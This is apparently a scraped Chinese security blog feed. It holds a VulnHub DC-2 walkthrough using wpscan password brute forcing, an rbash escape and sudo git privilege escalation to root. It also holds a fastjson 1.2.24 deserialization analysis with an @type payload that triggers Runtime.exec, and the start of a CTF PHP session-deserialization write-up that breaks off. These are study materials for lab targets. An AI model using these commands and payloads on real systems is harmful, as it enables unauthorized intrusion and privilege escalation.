href="http://dc-2/%EF%BC%8C%E6%9C%AC%E6%9C%BA%E5%8F%AF%E8%83%BD%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%BA%86%EF%BC%8C%E5%9C%A8hosts%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%EF%BC%8C%E6%B8%B8%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%9C%A8%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E4%B8%AD%E5%8F%91%E7%8E%B0flag1%E3%80%82">http://dc-2/，本机可能解析不了，在hosts文件中添加DNS域名解析记录，游览器访问，在当前页面中发现flag1。</a></p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/3.png" class><p>它提示我们登录获取下一个flag。很明显，这个网站用的是WordPress框架。</p><h4 id="获取flag2"><a href="#获取flag2" class="headerlink" title="获取flag2"></a>获取flag2</h4><p>提示我们登录进去，那么首先得找到后台登录页面，用kali自带的dirb扫描目录。</p><h5 id="dirb扫描目录"><a href="#dirb扫描目录" class="headerlink" title="dirb扫描目录"></a>dirb扫描目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb是kali自带的一种扫描工具，dirb是一个基于字典的web目录扫描工具，采用递归的方式来获取更多的目录，可以查找到已知的和隐藏的目录，基于字典扫描，就类似于dirsearch，命令也很简单，直接用dirb后面接上url</span><br></pre></td></tr></table></figure><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/4.png" class><p>有后台管理目录，访问跳转到后台登录页面。</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5.png" class><p>一般登录网站的后台，首先都会想到弱口令和爆破。那么关于弱口令，怎么又去收集字典。</p><h5 id="cewl生成字典"><a href="#cewl生成字典" class="headerlink" title="cewl生成字典"></a>cewl生成字典</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl是一个字典生成工具，kali自带。Cewl可以通过抓取指定的目标网页并提取其中的文本内容来构建字典。它会遵循链接，并递归地爬取其他页面。分析爬取的文本内容，提取其中的单词、短语和特定模式的字符串。基于提取的单词和短语，Cewl将它们组合成一个自定义字典（wordlist）。这个字典可以用于密码破解、社会工程学攻击、安全测试和其他相关用途。</span><br><span class="line">通过命令cewl http://dc-2/ &gt; 1.txt  爬取靶机web页面的信息用于生成爆破账号密码的字典保存在1.txt中。</span><br></pre></td></tr></table></figure><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6.png" class><h5 id="枚举出用户名"><a href="#枚举出用户名" class="headerlink" title="枚举出用户名"></a>枚举出用户名</h5><p>前面我们提到用的是WordPress的站，那么可以用专门针对于WordPress的工具来进行渗透。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WPScan是一款用于WordPress网站的安全扫描工具，旨在帮助评估和增强WordPress网站的安全性。它是一个开源工具，具有广泛的功能和功能，可以用于渗透测试、漏洞评估和安全审计。</span><br><span class="line">它可以对WordPress站点进行漏洞扫描，弱密码爆破，枚举用户名，识别主题插件，敏感信息泄露，扫描数据库等等。</span><br><span class="line">扫描目标网站：wpscan --url &lt;target_url&gt;</span><br><span class="line">扫描目标网站并且输出详细信息：wpscan --url &lt;target_url&gt; --enumerate &lt;option&gt;</span><br><span class="line">弱密码破解：wpscan --url &lt;target_url&gt; --passwords &lt;wordlist_path&gt;</span><br><span class="line">扫描目标网站的数据库：wpscan --url &lt;target_url&gt; --enumerate d</span><br><span class="line">扫描目标网站漏洞：wpscan --url &lt;target_url&gt; --enumerate vp</span><br><span class="line">扫描网站主题插件：wpscan --url &lt;target_url&gt; --enumerate t</span><br></pre></td></tr></table></figure><p>使用wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate u命令对用户名进行枚举</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7.png" class><p>枚举出三个可用用户名，分别为admin，jerry，tom这三个。</p><h5 id="暴力破解密码"><a href="#暴力破解密码" class="headerlink" title="暴力破解密码"></a>暴力破解密码</h5><p>直接使用wpscan工具的弱密码爆破功能，使用相关命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --passwords 1.txt</span><br></pre></td></tr></table></figure><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/8.png" class><p>爆破出了两个密码，用其中一组账号密码登录到后台。登录进去后随便翻翻看看，在Pages模块中找到flag2。</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9.png" class><p>提示说如果你不能利用WordPress并采取一条捷径，还有另外一种方法。那么就是靶机开放的另一种服务了，也就是ssh。</p><h4 id="获取flag3-amp-amp-flag4"><a href="#获取flag3-amp-amp-flag4" class="headerlink" title="获取flag3&amp;&amp;flag4"></a>获取flag3&amp;&amp;flag4</h4><h5 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSH登录远程主机的命令格式：</span><br><span class="line">ssh [选项] [用户名@]主机</span><br><span class="line">其参数可控，-p指SSH服务的端口，-i指定用于身份验证的私钥文件，-l指定登录的用户名，-A启用身份验证代理。这将允许您在通过SSH登录到一个主机后，无需再次输入密码或密钥即可连接到其他主机。</span><br></pre></td></tr></table></figure><p>使用相关命令：ssh <a href="mailto:&#116;&#111;&#109;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#52;&#55;&#x2e;&#x31;&#51;&#54;">&#116;&#111;&#109;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#52;&#55;&#x2e;&#x31;&#51;&#54;</a> -p 7744登录。</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/10.png" class><p>在家目录中找到flag3，cat命令用不了，vi编译器查看文件。可以看到当我们使用cat命令查看的时候，会有rbash的报错，而rbash是一种受限制的命令解释器，rbash是Bash的一种配置，用于提供有限的操作和限制用户的权限，以增加系统安全性。那这种限制是否能够绕过呢？答案是可以的。</p><h5 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h5><p>试了一下几个命令cd，cat都不行。拿到的shell也是用处不大的，所以我们需要绕过rbash。这篇文章只记录绕过的方法，原理分析改天再记录，相关文章：<a href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $PATH 输出环境变量</span><br></pre></td></tr></table></figure><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/11.png" class><p>使用ls查看以下这个目录的相关信息</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/12.png" class><p>四个可用命令，使用以下命令来绕过rbash。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line"><span class="comment">#利用bash_cmds自定义一个shell，将/bin/sh与与变量a关联</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/</span><br><span class="line"><span class="comment">#将当前PATH环境变量的值与/bin/路径进行连接，然后将结果重新赋值给PATH环境变量。</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin</span><br><span class="line"><span class="comment">#将当前PATH环境变量的值与/usr/bin路径进行连接，并将结果重新赋值给PATH环境变量。</span></span><br><span class="line"><span class="built_in">echo</span> /*</span><br><span class="line"><span class="comment">#输出根目录下的文件</span></span><br></pre></td></tr></table></figure><p>其实绕过rbash的限制的根本方法就是再执行一个&#x2F;bin&#x2F;bash命令，生成一个新的，没有添加限制的纯天然shell解释器。以上代码就是重新定义一个shell变量a，将&#x2F;bin和&#x2F;usr&#x2F;bin拼接原有环境变量赋予给新的shell变量中，目的就是为了能够执行这两个路径下的命令。最后在这个shell变量中执行echo语句。</p><p>总的来说，这段代码的目的是通过利用关联数组来绕过<code>rbash</code>的限制，并将<code>/bin/sh</code>路径关联到键<code>a</code>。然后，通过更新<code>PATH</code>环境变量，添加<code>/bin/</code>和<code>/usr/bin</code>路径，以绕过<code>rbash</code>对特定路径下命令的限制。这样，我们可以通过执行关联数组中的键<code>a</code>间接执行<code>/bin/sh</code>，并使用更新的<code>PATH</code>环境变量来访问<code>/bin/</code>和<code>/usr/bin</code>中的命令。</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/13.png" class><p>成功绕过rbash。进入到jerry目录发现了flag4，可以用cat命令查看：</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/14.png" class><p>提示说还有最后一个旗帜，最后一句提示用git。</p><h4 id="获取final-flag"><a href="#获取final-flag" class="headerlink" title="获取final_flag"></a>获取final_flag</h4><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su jerry 切换到jerry用户</span><br></pre></td></tr></table></figure><p>直接使用ssh远程登录到jerry用户是行不通的。切换账号后发现没有rbash的限制。</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/15.png" class><p>不能进入到root目录，因为权限不够。输入sudo -l列出当前用户在当前主机上的sudo特权</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/16.png" class><p>它允许用户”jerry”以root身份执行”&#x2F;usr&#x2F;bin&#x2F;git”命令，而无需进行密码验证。那么我们就可以通过&#x2F;usr&#x2F;bin&#x2F;git来提权。百度git提权，输入命令 sudo git help status 该命令打开git命令的帮助文档，在下面直接输入!&#x2F;bin&#x2F;bash进行提权。</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/17.png" class><p>提权成功，最后就进入root找到最后的flag了。</p><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/18.png" class><p>本靶场通关结束。</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化原理分析</title>
      <link href="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近这段时间打算入门fastjson反序列化漏洞篇，fastjson反序列化漏洞近些年也比较火，漏洞多，危害大。无论是实际运用场景还是面试问题都是比较热门的，另外在CTF的java题中也常见。因此，这篇文章就针对于fastjson反序列化漏洞的基础以及原理分析。（ps：不得不说，json库的源码真的好复杂好难看，基本都是边调试边问AI，最后终于模模糊糊走了一遍流程）</p><h2 id="0x02-fastjson基础"><a href="#0x02-fastjson基础" class="headerlink" title="0x02 fastjson基础"></a>0x02 fastjson基础</h2><p>FastJson是阿里巴巴集团开发的一个高性能的开源的Java JSON 库。它提供了一套强大的功能，包括将 Java 对象与 JSON 数据之间的互相转换、高效的序列化和反序列化、灵活的 JSON 解析和生成等。</p><p>Maven项目中导入相关依赖：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>我导入的是1.2.24版本，最先开始发现漏洞的一个版本。</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化常用JSON.toJSONString方法，它可以将对象转换为json格式。</p><p>序列化代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsontest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Demo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">        demo.setName(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        demo.setAge(<span class="number">19</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(demo,SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonString);</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/1.png" class><p>在序列化的时候调用了gettar方法。SerializerFeature.WriteClassName是FastJson 序列化特性的一个选项，用于在序列化过程中包含类名信息。当设置了这个特性的时候，FastJson生成的Json字符串会添加一个@type字段，该字段的值为对象所属类的全限定名。也正是有这个@type，在Fastjson反序列化的时候，可以指定任意反序列化的类，因为用户输入的json串是可控的，有点类似与后门。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>漏洞代码为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoTest1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoTest1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个javabean格式的类，在getProperties方法里有一个弹计算器的恶意代码。</p><p>反序列化代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonUnserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.test.DemoTest1\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;123\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看运行结果：</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/2.png" class><p>我们传入的json串在反序列化的时候会自动调用getter和setter方法。</p><p>Fastjson反序列化采用<code>JSON.parseObject()</code>和<code>JSON.parse()</code>这两个方法，<code>parseObject</code>：返回 <code>fastjson.JSONObject</code> 类</p><p><code>parse</code>返回我们本身的类。跟进这两个方法，最终都是会走到这里，</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/3.png" class><p>只不过<code>JSON.parseObject()</code>封装的多一点，其实都大同小异。</p><h2 id="0x03-fastjson反序列化原理"><a href="#0x03-fastjson反序列化原理" class="headerlink" title="0x03 fastjson反序列化原理"></a>0x03 fastjson反序列化原理</h2><p>其实在反序列化演示过程中是能够弹出计算器的。既然能够执行恶意代码，那么必然是有漏洞的。其中有两点必然条件：第一，Fastjson规范有@type的键值对，能够反序列化指定的任意的类。第二，在反序列化会自动调用javabean的set和get方法，这就类似于反序列化的入口，我们可以从这个入口进去寻找链子。</p><p>那么现在就有个问题，fastjson反序列化的时候为什么会调用getter和setter方法，再通俗一点来说，为什么会弹出计算器，那只能去扒拉json库的源码看看了。</p><h2 id="0x04-fastjson反序列化源码分析"><a href="#0x04-fastjson反序列化源码分析" class="headerlink" title="0x04 fastjson反序列化源码分析"></a>0x04 fastjson反序列化源码分析</h2><p>在反序列化函数这里下个断点：</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/4.png" class><p>调试，跟进<code>parseObject</code>方法，开头都是互相调的过程，省略，到最后都是会走到</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/5.png" class><p>实例化一个默认的Json解析器，跟进去这个解析器，走到它的构造方法里，</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/6.png" class><p>取解析器所指向的第一个字符（也就是{），进入下面的if判断，将 lexer 的标记（token）设置为 JSONToken.LBRACE，表示当前标记是左大括号。然后调用默认解析器的parse方法，跟进到这个方法里面。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/7.png" class><p>switch语句判断标识符，实例化一个JSONobject，它是一个map。最后调用一个重要的方法，parseObject方法。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/8.png" class><p>获取json字符串第一个键名为@type。后面有一个对key的判断，进入到这个if分支里。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/9.png" class><p>最后来到反序列化的重要漏洞点。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/10.png" class><p>跟进到getDeserializer类的构造方法里，都是一些if条件判断语句，最后调用createJavaBeanDeserializer方法，跟进</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/11.png" class><p>这个方法开头设置一个asmEnable布尔型的标识，然后获取给定类型的注解对象，也就是获取用户自定义的反序列化器类，如果存在自定义反序列化器类并创建成功，且该反序列化器实现了 <code>ObjectDeserializer</code> 接口，则将其返回作为结果。这样可以在反序列化过程中根据注解的设定使用自定义的反序列化逻辑，当然这些都不重要，我们调试漏洞肯定用的都是默认的。下面还是一系列的if判断，最终漏洞点在这里</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/12.png" class><p>跟进到这个build方法，前面这一段通过反射获取到类的相关信息，方法，字段等等。最后来到第328行，遍历类中的方法，</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/13.png" class><p>这段代码逻辑就是筛选出符合条件的setter方法，看代码需要满足以下几个条件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 方法名长度不小于4（满足javabean规范的方法）</span><br><span class="line">2. 不能是静态方法</span><br><span class="line">3. 返回值是void</span><br><span class="line">4. 传入的参数个数为1</span><br><span class="line">5. 方法名为set打头</span><br></pre></td></tr></table></figure><p>满足这些条件之后，把可用的 setter 方法放到 fieldList 里面</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/14.png" class><p>遍历完setter方法后，就开始遍历getter方法，条件判断大同小异，逻辑大差不差。getter方法需要满足以下几个条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 方法名长度不小于4</span><br><span class="line">2. 不能是静态方法</span><br><span class="line">3. 方法名要 get 开头同时第四个字符串要大写</span><br><span class="line">4. 方法返回的类型必须继承自 Collection Map AtomicBoolean AtomicInteger AtomicLong</span><br><span class="line">5. 传入的参数个数需要为 0</span><br></pre></td></tr></table></figure><p>符合以上条件的方法会被添加到FieldInfo里。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/15.png" class><p>Properties继承了Hashtable，能够满足条件。最后返回JavaBeanInfo对象。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/16.png" class><p>这个FieldInfo里存放了满足两个条件的属性。一路返回，跟进到deserialze方法。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/17.png" class><p>死循环，迭代处理字段，并且调用它的getter（setter）方法，往下看。又是一大堆的if判断，判断字段的类型，当遍历到properties字段的时候，跟进到parseField方法。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/18.png" class><p>它在方法的最后还调用了parseField方法，那么继续跟进，进入到这个setValue方法</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/19.png" class><p>又是判断字段的类型，当前properties继承的Map，进入到这个if分支里。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/20.png" class><p>熟悉的代码，不就像动态代理嘛，当前的object为漏洞测试代码，method为getProperties方法，它会动态调用当前漏洞类的getProperties方法，当前方法有弹出计算器的恶意代码。</p><p>弹出计算器了。</p><img src="/2023/07/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/21.png" class><p>到此整个流程分析结束。</p><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>fastjson库的代码还是要多看，跟着动态调试的时候很容易就迷了，比较复杂。对于fastjson反序列化漏洞，首先找到反序列化点，也就是反序列化函数（parseObject），传入的poc，也就是要反序列化的json串必须是@type打头的，另外找到反序列化的入口（也就是反序列化的时候会调用getter和seter方法）入门的话不是很难。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bestphp&#39;s revenge题目详解</title>
      <link href="/2023/04/28/bestphp-s-revenge%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/04/28/bestphp-s-revenge%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天刷题遇到一个比较有意思的题目。每个知识点我都知道，把他们放在一块我就不知道怎么去搞了。所谓知识点考的是非常灵活了，涉及到的知识有session反序列化，变量覆盖，利用原生类触发ssrf等等。考的内容也比较多。个人感觉还是有必要记录下来的，也正好复习一下php的知识。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>一段很短的源代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>flag.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!<span class="title function_ invoke__">session_start</span>(); <span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; <span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>; &#125; only localhost can get flag! </span><br></pre></td></tr></table></figure><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>乍一看代码，只能把利用点放在call_user_func的函数调用上，而且有两处。我还怀疑为什么有两处，再一看回调函数的参数，函数名可控，可以任意调。参数是一个数组，再一想，好像没有什么命令执行函数能用。看第二个回调函数的参数，函数名是implode，一个把数组转换为字符串的函数，没啥用的。参数值由name传进去，是可控的。目前来说通过call_user_func函数来执行命令是不太现实的。下面的flag文件是扫目录扫出来的，提示从本地访问，然后就把flag写进session里，看到这里好像就有点思路了。肯定是要SSRF的，也想过通过原生类来实现SSRF。那么按照这个思路走的话，有两个问题。反序列化点和__call魔术方法触发点。</p><h4 id="寻找反序列化点"><a href="#寻找反序列化点" class="headerlink" 